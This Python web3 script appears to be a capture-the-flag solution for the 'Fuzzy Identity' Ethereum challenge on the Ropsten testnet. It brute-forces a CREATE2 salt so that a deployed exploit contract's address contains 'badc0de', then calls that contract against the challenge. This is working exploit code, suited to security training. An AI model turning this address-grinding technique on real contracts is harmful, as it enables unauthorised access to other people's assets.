from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CHALLENGE_CONTRACT_ADDRESS = "0xafC29b9a8c7f04f82DdB4b2d1C480A8beda89dA6"

with open('CTE_Contracts/FuzzyIdentityChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_challenge_code = compile_source(challenge_code, solc_version="0.4.21")
compilation_output = compiled_challenge_code["<stdin>:FuzzyIdentityChallenge"]
challenge_contract_abi = compilation_output["abi"]
challenge_contract = w3.eth.contract(address=CHALLENGE_CONTRACT_ADDRESS, abi=challenge_contract_abi)

with open("ExploitContracts/Create2Deployer.sol", "r") as file:
    deployer_code = file.read()

compiled_deployer_code = compile_source(deployer_code, solc_version="0.8.0")
compilation_output = compiled_deployer_code["<stdin>:Create2Deployer"]
deployer_abi = compilation_output["abi"]
deployer_bytecode = compilation_output["bin"]
deployer_contract = w3.eth.contract(abi=deployer_abi, bytecode=deployer_bytecode)
construct_txn = deployer_contract.constructor().buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(construct_txn, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)
deployer_instance = w3.eth.contract(address=receipt.contractAddress, abi=deployer_abi)

with open("ExploitContracts/FuzzyIdentity.sol", "r") as file:
    exploit_code = file.read()

compiled_exploit_code = compile_source(exploit_code, solc_version="0.8.0")
compilation_output = compiled_exploit_code["<stdin>:FuzzyIdentityExploiter"]
exploit_contract_abi = compilation_output["abi"]
exploit_contract_bytecode = compilation_output["bin"]

salt = 0
deployed_address = ""
bytecode_hash = str(hex(Web3.toInt(Web3.keccak(hexstr=exploit_contract_bytecode)))).replace("0x", "")
while True:

    salt_str = str(salt).zfill(64)

    deployed_address = Web3.toHex(Web3.keccak(hexstr="0xff"+deployer_instance.address.replace("0x", "")+
                                                 salt_str+bytecode_hash))[26:]

    if "badc0de" in deployed_address.lower():
        print(f"salt: {salt}")
        break

    salt += 1

salt_padded = str(salt).zfill(64)
tx = deployer_instance.functions.deploy(Web3.toBytes(hexstr=salt_padded),
                                        Web3.toBytes(hexstr=exploit_contract_bytecode)).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

exploit_contract_address = deployer_instance.functions.last_deployed().call()
exploit_contract_instance = w3.eth.contract(address=exploit_contract_address, abi=exploit_contract_abi)
tx = exploit_contract_instance.functions.exploit(CHALLENGE_CONTRACT_ADDRESS).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert challenge_contract.functions.isComplete().call()

